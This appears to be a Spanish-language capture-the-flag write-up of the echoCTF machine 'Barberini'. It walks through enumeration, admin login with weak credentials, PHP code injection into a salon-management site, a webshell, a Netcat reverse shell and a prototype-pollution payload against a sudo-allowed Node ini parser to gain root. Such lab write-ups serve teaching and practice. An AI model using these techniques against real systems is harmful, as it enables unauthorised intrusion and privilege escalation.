---
layout: single
title: echoCTF - Barberini
excerpt: "Barberini es una máquina de la plataforma echoCTF de dificultad avanzada. Fue parte de la clasificatoria del HACKMEX6. En esta máquina, se exploran temas relacionados con el uso de credenciales débiles y la carga de archivos como medios para obtener acceso inicial. Además, para lograr una escalaci&oacute;n de privilegios exitosa, se aprovecha una vulnerabilidad de 'prototype pollution' que afecta al compilador/decompilador 'ini' para Node."
date: 2023-11-06
classes: wide
header:
  teaser: /assets/images/echoCTF-writeup-barberini/barberin.png
  teaser_home_page: true
  icon: /assets/images/echoCTF-writeup-barberini/iconecho.png
categories:
  - echoCTF
  - Web Pentesting
  - HACKMEX6
tags:
  - LFI
  - FIle Upload
  - Prototype Pollution
---

<style>
body
{
  margin: 0;
  padding: 0;
}

.glitch
  {
    position: relative;
    width: 100%;
    height: 50vh;
    background-image:url("/assets/images/echoCTF-writeup-barberini/barberin.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
 }

.glitch:before
  {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url("/assets/images/echoCTF-writeup-barberini/barberin.png");
    background-size: cover; /* contain for split effect */
    opacity: .5;
    mix-blend-mode: hard-light;
    animation: glitch2 10s linear infinite;
  }

.glitch:hover:before
{
  animation: glitch1 1s linear infinite;
}

@keyframes glitch1
{
  0%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  10%
  {
    background-position: 5px 0;
  }
  20%
  {
    background-position: -5px 0;
  }
  30%
  {
    background-position: 15px 0;
  }
  40%
  {
    background-position: -5px 0;
  }
  50%
  {
    background-position: -25px 0;
  }
  60%
  {
    background-position: -50px 0;
  }
  70%
  {
    background-position: 0 -20px;
  }
  80%
  {
    background-position: -60px -20px;
  }
  81%
  {
    background-position: 0 0;
  }
  100%
  {
    background-position: 0 0;
    filter: hue-rotate(360deg);
  }
}

@keyframes glitch2
{
  0%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  10%
  {
    background-position: 15px 0;
  }
  15%
  {
    background-position: -15px 0;
  }
  20%
  {
    filter: hue-rotate(360deg);
  }
  25%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  100%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
}

@media (max-width: 767.5px) {

.glitch{
position: relative;
    width: 50%;
    height: 50vh;
    background-image:url("/assets/images/echoCTF-writeup-barberini/barberin.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
}
}


@media (max-width: 575.5px) { 

.glitch{
position: relative;
    width: 50%;
    height: 25vh;
    background-image:url("/assets/images/echoCTF-writeup-barberini/barberin.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
}
}


</style>
<body>
    <div class="glitch">  
    </div>
</body>




<!--<img  src="/assets/images/htb-writeup-sauna/sauna_logo.png" style="width:75%; border-radius:10px; display: block; margin-left: auto;  margin-right: auto;">
-->

## Resumen

Barberini es una m&aacute;quina de la plataforma echoCTF de dificultad avanzada. Fue parte de la clasificatoria del HACKMEX6. En esta m&aacute;quina, se exploran temas relacionados con el uso de credenciales d&eacute;biles y la carga de archivos como medios para obtener acceso inicial. Adem&aacute;s, para lograr una escalaci&oacute;n de privilegios exitosa, se aprovecha una vulnerabilidad de "prototype pollution" que afecta al compilador/decompilador "ini" para Node.

## Enumeración
Realizando un escaneo de puertos con la herramienta nmap identifiqué los siguientes puertos abiertos:<br>
- 22 SSH
- 1337 HTTP
- 3306 MYSQL 

```bash
Nmap scan report for 10.0.30.0
Host is up, received user-set (0.29s latency).
Scanned at 2023-09-19 18:24:49 EDT for 19s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
1337/tcp open  http    syn-ack ttl 63 nginx 1.18.0
3306/tcp open  mysql   syn-ack ttl 63 MySQL 5.5.5-10.5.19-MariaDB-0+deb11u2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Enumeración Web

El sitio web que tiene alojado la m&aacute;quina es el siguiente: <br>

![](/assets/images/echoCTF-writeup-barberini/web.png)

Para obtener más información acerca de las tecnologías empleadas en el sitio web utilicé la herramienta **whatweb**.
<br>
```bash
root@kali:~# whatweb http://10.0.30.0:1337/
http://10.0.30.0:1337/ [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[oretnom23@gmail.com], HTML5, HTTPServer[nginx/1.18.0], IP[10.0.30.0], JQuery, Script, Title[Men&apos;s Salon Management System - PHP], nginx[1.18.0]
```

Mediante un escaneo de archivos y directorios utilizando la herramienta wfuzz identifique los siguientes directorios en la pagina web.

```bash
┌──(root㉿kali)-[/home/kali]
└─# wfuzz -c --hc=404 --hh=16268 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.0.30.0:1337/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.0.30.0:1337/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                           
=====================================================================

000000164:   301        7 L      11 W       169 Ch      "uploads"                                                         
000000259:   301        7 L      11 W       169 Ch      "admin"                                                           
000000519:   301        7 L      11 W       169 Ch      "plugins"                                                         
000000821:   301        7 L      11 W       169 Ch      "database"                                                        
000001428:   301        7 L      11 W       169 Ch      "classes"                                                         
000001503:   301        7 L      11 W       169 Ch      "dist"                                                            
000002190:   301        7 L      11 W       169 Ch      "inc"
```


navegando en el sitio web como un usuario com&uacute;n, identifique el panel de administraci&oacute;n y logr&oacute; acceder utilizando las credenciales **admin:admin123**

![](/assets/images/echoCTF-writeup-barberini/dash.png)

Dentro del panel de administraci&oacute;n, como parte de las primeras pruebas, intent&oacute; cargar un archivo malicioso en la p&aacute;gina web; sin embargo, no tuve &eacute;xito. Posteriormente inserte c&oacute;digo PHP en la secci&oacute;n About us sin embargo al consultar la p&aacute;gina principal el c&oacute;digo PHP no se interpreto

![](/assets/images/echoCTF-writeup-barberini/about.png)

Nuevamente inserte c&oacute;digo PHP pero esta vez intercepte la solicitud con burp y pude ver que se estaban agregando comentarios para evitar que el c&oacute;digo PHP se interpretara correctamente

![](/assets/images/echoCTF-writeup-barberini/burp.png)

As&iacute;­ que, modifiqu&eacute; el codigo PHP de manera adecuada, eliminando los comentarios HTML, y luego la envi&oacute; al servidor.

![](/assets/images/echoCTF-writeup-barberini/php.png)

Al verificar la p&aacute;gina principal, not&eacute; que el c&oacute;digo PHP se interpret&aacute; correctamente

![](/assets/images/echoCTF-writeup-barberini/phpp.png)

Una vez que confirm&eacute; que el c&oacute;digo PHP pod&iacute;­a interpretarse, cargu&eacute; una webshell en la p&aacute;gina y logr&eacute; ejecutar comandos

![](/assets/images/echoCTF-writeup-barberini/ws.png)

Luego, verifiqu&eacute; que la m&aacute;quina tuviera Netcat instalado utilizando el comando **which nc** y proced&iacute;­ a enviar una reverse shell con Netcat

![](/assets/images/echoCTF-writeup-barberini/rs.png)

```bash
┌──(root@kali)-[/opt/Reverse Shell]
└─# nc -lvp 443  
listening on [any] 443 ...
10.0.30.0: inverse host lookup failed: Unknown host
connect to [10.10.5.110] from (UNKNOWN) [10.0.30.0] 40860
```

Para trabajar de manera m&aacute;s c&oacute;moda, realic&eacute; un ajuste en la TTY

```bash
┌──(root@kali)-[/opt/Reverse Shell]
└─# nc -lvp 443  
listening on [any] 443 ...
10.0.30.0: inverse host lookup failed: Unknown host
connect to [10.10.5.110] from (UNKNOWN) [10.0.30.0] 40860
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@barberini:~/html$ ^Z
zsh: suspended  nc -lvp 443
                                                                                                                                   
┌──(root@kali)-[/opt/Reverse Shell]
└─# stty raw -echo; fg   
[1]  + continued  nc -lvp 443
                             reset
reset: unknown terminal type unknown
Terminal type? xterm
www-data@barberini:~/html$ export TERM=xterm
www-data@barberini:~/html$ export SHELL=bash
www-data@barberini:~/html$ 
```

## Escalada de privilegios

Una vez dentro de la m&aacute;quina, ejecutando **sudo -l**, pude ver que puedo ejecutar el binario /usr/local/bin/jini como propiedad de root sin necesidad de proporcionar contrase&ntilde;a.

```bash
www-data@barberini:~/html$ sudo -l
Matching Defaults entries for www-data on barberini:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on barberini:
    (ALL : ALL) NOPASSWD: /usr/local/bin/jini
``` 
El contenido del binario es el siguiente:

```bash
www-data@barberini:~/html$ cat /usr/local/bin/jini
#!/usr/bin/env node
var fs = require('fs')
var ini = require('js-ini')
const myArgs = process.argv.slice(2);
if (myArgs.length < 1) {
  console.error(`provide a ini file to parse`)
  return
}

var parsed = ini.parse(fs.readFileSync(myArgs[0], 'utf-8'))
if(isAdmin){
  console.log("Awesome!!!")
  require('child_process').execSync(
    '/bin/bash -l -p',
    { stdio: 'inherit' }
  );
}
```

Para poder escalar privilegios utilice la siguiente referencia https://security.snyk.io/vuln/SNYK-JS-INI-1048974 donde indican que el codificador/decodificador ini para node se ve afectada por una vulnerabilidad Prototype Pollution. El payload que utilice para explotar la vulnerabilidad fue el siguiente:

```bash
[__proto__]
isAdmin = "polluted"
```
Por &Uacute;ltimo, lo transfer&iacute;­ a la maquina v&iacute;­ctima y ejecute sudo **/usr/local/bin/jini payload.ini** para poder obtener una Shell como el usuario root

```bash
www-data@barberini:/tmp$ sudo /usr/local/bin/jini payload.ini 
Awesome!!!
root@barberini:/tmp# whoami
root
root@barberini:/tmp# 

```
